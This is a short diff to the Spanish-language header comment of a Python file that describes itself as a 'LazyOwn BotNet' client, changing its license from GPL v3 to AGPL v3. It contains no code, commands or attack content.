@@ -5,7 +5,7 @@ main.py
 Autor: Gris Iscomeback
 Correo electrónico: grisiscomeback[at]gmail[dot]com
 Fecha de creación: 09/06/2024
-Licencia: GPL v3
+Licencia: AGPL v3
 
 Descripción: Cliente LazyOwn BotNet
 
